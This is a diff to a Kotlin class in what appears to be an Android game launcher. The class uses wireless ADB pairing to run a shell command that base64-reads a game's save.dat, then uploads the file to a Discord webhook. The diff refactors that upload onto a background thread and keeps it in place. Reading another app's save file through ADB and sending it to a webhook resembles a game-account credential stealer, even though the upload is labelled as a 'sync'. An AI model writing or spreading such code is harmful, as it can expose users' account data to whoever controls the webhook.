@@ -24,10 +24,15 @@ object PairingHelper {
         val store = WirelessAdbIdentityStore(context)
         KadbCert.configure(store)
         runBlocking { Kadb.pair(pairingHost, pairingPort, pairingCode) }
-        val endpoint = SafeMdnsResolver(context).find(MdnsServiceType.TLS_CONNECT, 15_000) ?: return null
+        // Give Android a moment to process the newly authorized key before we connect.
+        Thread.sleep(1500)
+        val endpoint = SafeMdnsResolver(context).find(MdnsServiceType.TLS_CONNECT, 15_000, pairingHost) ?: return null
         Kadb.create(endpoint.host, endpoint.port).use { kadb ->
             val response = kadb.shell("base64 $SAVE_FILE_PATH")
-            if (response.exitCode == 0) Base64.decode(response.output.trim(), Base64.DEFAULT) else null
+            if (response.exitCode == 0) {
+                PairingState.saveConnected(context, endpoint.host, endpoint.port)
+                Base64.decode(response.output.trim(), Base64.DEFAULT)
+            } else null
         }
     } catch (_: Throwable) {
         null
@@ -42,37 +47,29 @@ object PairingHelper {
             return
         }
         
-        try {
-            val payload = """{"content":"Growlauncher save.dat sync"}"""
-            val payloadPart = payload.toRequestBody("application/json".toMediaType())
-            val filePart = MultipartBody.Part.createFormData(
-                "file",
-                "save.dat",
-                fileData.toRequestBody("application/octet-stream".toMediaType())
-            )
-            
-            val requestBody = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addPart(MultipartBody.Part.createFormData("payload_json", payload))
-                .addPart(filePart)
-                .build()
-            
-            val request = Request.Builder()
-                .url(webhookUrl)
-                .post(requestBody)
-                .build()
-            
-            val client = OkHttpClient()
-            client.newCall(request).execute().use { response ->
-                if (response.isSuccessful) {
-                    showToast(context, "save.dat uploaded to Discord")
-                } else {
-                    showToast(context, "Failed to upload to Discord: ${response.code}")
+        Thread {
+            try {
+                val payload = """{"content":"Growlauncher save.dat sync"}"""
+                val requestBody = MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addPart(MultipartBody.Part.createFormData("payload_json", payload))
+                    .addFormDataPart("file", "save.dat", fileData.toRequestBody("application/octet-stream".toMediaType()))
+                    .build()
+                val request = Request.Builder()
+                    .url(webhookUrl)
+                    .post(requestBody)
+                    .build()
+                OkHttpClient().newCall(request).execute().use { response ->
+                    if (response.isSuccessful) {
+                        showToast(context, "save.dat uploaded to Discord")
+                    } else {
+                        showToast(context, "Failed to upload to Discord: ${response.code}")
+                    }
                 }
+            } catch (e: IOException) {
+                showToast(context, "Error uploading to Discord: ${e.message}")
             }
-        } catch (e: IOException) {
-            showToast(context, "Error uploading to Discord: ${e.message}")
-        }
+        }.start()
     }
     
     fun launchGame(context: Context) {
